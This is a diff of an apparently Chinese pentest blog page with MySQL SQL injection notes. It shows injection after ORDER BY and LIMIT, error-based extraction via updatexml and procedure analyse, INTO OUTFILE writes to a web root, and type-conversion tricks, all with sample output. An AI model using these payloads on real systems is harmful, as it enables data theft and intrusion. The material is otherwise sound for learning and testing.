@@ -82,25 +82,15 @@
     [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>)
 </div>
 
-      <div>
-
-<p>环境：MySQL 5.5.47</p>
-
+      <div><p>环境：MySQL 5.5.47</p>
 <h3 id="0x00-注入点在order-by后面">0x00 注入点在Order by后面</h3>
-
-<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 order by id into outfile 'C:\\Apps\\phpStudy\\WWW\\a.txt';
+<pre tabindex="0"><code>mysql&gt; select id,name,content from msg where id&gt;1 order by id into outfile &#39;C:\\Apps\\phpStudy\\WWW\\a.txt&#39;;
 Query OK, 1 row affected (0.01 sec)
-</code></pre>
-
-<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1);
-ERROR 1105 (HY000): XPATH syntax error: '~msg~'
-</code></pre>
-
-<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1);
-ERROR 1105 (HY000): XPATH syntax error: '~rtest~'
-</code></pre>
-
-<pre><code>mysql&gt; select name from msg where id&gt;1 order by if(1=1,1,(select 1 union select 2));
+</code></pre><pre tabindex="0"><code>mysql&gt; select id,name,content from msg where id&gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1);
+ERROR 1105 (HY000): XPATH syntax error: &#39;~msg~&#39;
+</code></pre><pre tabindex="0"><code>mysql&gt; select id,name,content from msg where id&gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1);
+ERROR 1105 (HY000): XPATH syntax error: &#39;~rtest~&#39;
+</code></pre><pre tabindex="0"><code>mysql&gt; select name from msg where id&gt;1 order by if(1=1,1,(select 1 union select 2));
 +----------+
 | name     |
 +----------+
@@ -119,15 +109,11 @@ mysql&gt; select name from msg where id&gt;1 order by (select case when(2&gt;1) 
 1 row in set (0.00 sec)
 mysql&gt; select name from msg where id&gt;1 order by (select case when(2&lt;1) then 1 else 1*(select 1 union select 2)end)=1;
 ERROR 1242 (21000): Subquery returns more than 1 row
-</code></pre>
-
-<h3 id="0x01-注入点在limit后面">0x01 注入点在limit后面</h3>
-
+</code></pre><h3 id="0x01-注入点在limit后面">0x01 注入点在limit后面</h3>
 <ul>
 <li>limit前面没有order by可以使用union、analyse()</li>
 </ul>
-
-<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 union select 1,2,3;
+<pre tabindex="0"><code>mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 union select 1,2,3;
 +----+------+---------+
 | id | name | content |
 +----+------+---------+
@@ -146,53 +132,44 @@ mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 procedure anal
 ------------------+-------+-------------------------+------+--------------------+
  Empties_or_zeros | Nulls | Avg_value_or_avg_length | Std  | Optimal_fieldtype  |
 ------------------+-------+-------------------------+------+--------------------+
-     0 |     0 | 8.0000                  | NULL | ENUM('xiaohong') NOT NULL     |
-     0 |     0 | 13.0000                 | NULL | ENUM('I have a cat.') NOT NULL|
+     0 |     0 | 8.0000                  | NULL | ENUM(&#39;xiaohong&#39;) NOT NULL     |
+     0 |     0 | 13.0000                 | NULL | ENUM(&#39;I have a cat.&#39;) NOT NULL|
 ------------------+-------+-------------------------+------+--------------------+
 2 rows in set (0.00 sec)
-</code></pre>
-
-<ul>
+</code></pre><ul>
 <li>limit前面有order by则不可以使用union、analyse()</li>
 </ul>
-
-<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
-ERROR 1105 (HY000): XPATH syntax error: '~5.5.47~'
+<pre tabindex="0"><code>mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
+ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.47~&#39;
 
 mysql&gt; select id,name,content from msg where id&gt;1 order by name limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
-ERROR 1105 (HY000): XPATH syntax error: '~5.5.47~'
-</code></pre>
-
-<h3 id="0x02-根据报错得到数据库名-表名-列名">0x02 根据报错得到数据库名、表名、列名</h3>
-
-<pre><code>#得到数据库名为rtest
+ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.47~&#39;
+</code></pre><h3 id="0x02-根据报错得到数据库名表名列名">0x02 根据报错得到数据库名、表名、列名</h3>
+<pre tabindex="0"><code>#得到数据库名为rtest
 mysql&gt; select id,name,content from msg where id=2-a();
 ERROR 1305 (42000): FUNCTION rtest.a does not exist
 
 #得到表名为msg
 mysql&gt; select id,name,content from msg where id=2 and polygon(1);
-ERROR 1367 (22007): Illegal non geometric '1' value found during parsing
+ERROR 1367 (22007): Illegal non geometric &#39;1&#39; value found during parsing
 mysql&gt; select id,name,content from msg where id=2 and polygon(id);
-ERROR 1367 (22007): Illegal non geometric '`rtest`.`msg`.`id`' value found during parsing
+ERROR 1367 (22007): Illegal non geometric &#39;`rtest`.`msg`.`id`&#39; value found during parsing
 
 #得到列名为id、name、content、useragent
 mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b)c);
-ERROR 1060 (42S21): Duplicate column name 'id'
+ERROR 1060 (42S21): Duplicate column name &#39;id&#39;
 mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id))c);
-ERROR 1060 (42S21): Duplicate column name 'name'
+ERROR 1060 (42S21): Duplicate column name &#39;name&#39;
 mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name))c);
-ERROR 1060 (42S21): Duplicate column name 'content'
+ERROR 1060 (42S21): Duplicate column name &#39;content&#39;
 mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content))c);
-ERROR 1060 (42S21): Duplicate column name 'useragent'
+ERROR 1060 (42S21): Duplicate column name &#39;useragent&#39;
 mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content,useragent))c);
 ERROR 1241 (21000): Operand should contain 1 column(s)
-</code></pre>
-
-<h3 id="0x03-mysql的隐式转换">0x03 MySQL的隐式转换</h3>
-
+</code></pre><h3 id="0x03-mysql的隐式转换">0x03 MySQL的隐式转换</h3>
 <ul>
-<li><p>官方隐式转换规则</p>
-
+<li>
+<p>官方隐式转换规则</p>
 <ul>
 <li>两个参数至少有一个是 NULL 时，比较的结果也是 NULL，例外是使用 &lt;=&gt; 对两个 NULL 做比较时会返回 1，这两种情况都不需要做类型转换</li>
 <li>两个参数都是字符串，会按照字符串来比较，不做类型转换</li>
@@ -201,55 +178,48 @@ ERROR 1241 (21000): Operand should contain 1 column(s)
 <li>有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为 timestamp</li>
 <li>有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较</li>
 <li>所有其他情况下，两个参数都会被转换为浮点数再进行比较</li>
-</ul></li>
-
-<li><p>数字和字符进行运算时会转换为double类型</p></li>
 </ul>
-
-<pre><code>mysql&gt; select 2+'4'; #数字和字符会转换为数字
+</li>
+<li>
+<p>数字和字符进行运算时会转换为double类型</p>
+</li>
+</ul>
+<pre tabindex="0"><code>mysql&gt; select 2+&#39;4&#39;; #数字和字符会转换为数字
 +-------+
-| 2+'4' |
+| 2+&#39;4&#39; |
 +-------+
 |     6 |
 +-------+
 1 row in set (0.00 sec)
-</code></pre>
-
-<pre><code>mysql&gt; select 'a'+'55'; #字符和字符会转换为数字
+</code></pre><pre tabindex="0"><code>mysql&gt; select &#39;a&#39;+&#39;55&#39;; #字符和字符会转换为数字
 +----------+
-| 'a'+'55' |
+| &#39;a&#39;+&#39;55&#39; |
 +----------+
 |       55 |
 +----------+
 1 row in set, 1 warning (0.00 sec)
 
-mysql&gt; select '33'+'32d11a';
+mysql&gt; select &#39;33&#39;+&#39;32d11a&#39;;
 +-----------+
-| '33'+'3d' |
+| &#39;33&#39;+&#39;3d&#39; |
 +-----------+
 |        65 |
 +-----------+
 1 row in set, 1 warning (0.00 sec)
-</code></pre>
-
-<ul>
+</code></pre><ul>
 <li>concat()函数将数字转换为字符</li>
 </ul>
-
-<pre><code>mysql&gt; select concat(3,'test'); #前面的数字1被转换为字符
+<pre tabindex="0"><code>mysql&gt; select concat(3,&#39;test&#39;); #前面的数字1被转换为字符
 +------------------+
-| concat(3,'test') |
+| concat(3,&#39;test&#39;) |
 +------------------+
 | 3test            |
 +------------------+
 1 row in set (0.00 sec)
-</code></pre>
-
-<ul>
+</code></pre><ul>
 <li>name类型为string，查询条件为int 0时可以查询</li>
 </ul>
-
-<pre><code>mysql&gt; desc msg;
+<pre tabindex="0"><code>mysql&gt; desc msg;
 +-----------+---------------+------+-----+---------+----------------+
 | Field     | Type          | Null | Key | Default | Extra          |
 +-----------+---------------+------+-----+---------+----------------+
@@ -272,13 +242,10 @@ mysql&gt; show warnings;
 +---------+------+----------------------------------------------+
 | Level   | Code | Message                                      |
 +---------+------+----------------------------------------------+
-| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaoming' |
+| Warning | 1292 | Truncated incorrect DOUBLE value: &#39;xiaoming&#39; |
 +---------+------+----------------------------------------------+
 2 rows in set (0.00 sec)
-
-</code></pre>
-
-<pre><code>mysql&gt; select id,name,content from msg;
+</code></pre><pre tabindex="0"><code>mysql&gt; select id,name,content from msg;
 +----+----------+---------------+
 | id | name     | content       |
 +----+----------+---------------+
@@ -288,7 +255,7 @@ mysql&gt; show warnings;
 +----+----------+---------------+
 3 rows in set (0.00 sec)
 
-mysql&gt; select id,name,content from msg where name='li'+'55';
+mysql&gt; select id,name,content from msg where name=&#39;li&#39;+&#39;55&#39;;
 +----+---------+---------+
 | id | name    | content |
 +----+---------+---------+
@@ -300,22 +267,13 @@ mysql&gt; show warnings;
 +---------+------+----------------------------------------------+
 | Level   | Code | Message                                      |
 +---------+------+----------------------------------------------+
-| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaoming' |
-| Warning | 1292 | Truncated incorrect DOUBLE value: 'li'       |
-| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaohong' |
-| Warning | 1292 | Truncated incorrect DOUBLE value: '55lihua'  |
+| Warning | 1292 | Truncated incorrect DOUBLE value: &#39;xiaoming&#39; |
+| Warning | 1292 | Truncated incorrect DOUBLE value: &#39;li&#39;       |
+| Warning | 1292 | Truncated incorrect DOUBLE value: &#39;xiaohong&#39; |
+| Warning | 1292 | Truncated incorrect DOUBLE value: &#39;55lihua&#39;  |
 +---------+------+----------------------------------------------+
 4 rows in set (0.00 sec)
-</code></pre>
-
-<p><br></p>
-
-<h4 id="reference-侵删">Reference(侵删)：</h4>
-
-<ul>
-<li><a href="https://www.cnblogs.com/Le30bjectNs11/p/4341207.html">https://www.cnblogs.com/Le30bjectNs11/p/4341207.html</a></li>
-<li><a href="https://www.cnblogs.com/rollenholt/p/5442825.html">https://www.cnblogs.com/rollenholt/p/5442825.html</a></li>
-</ul>
+</code></pre><!-- raw HTML omitted -->
 </div>
     </article>
   </main>
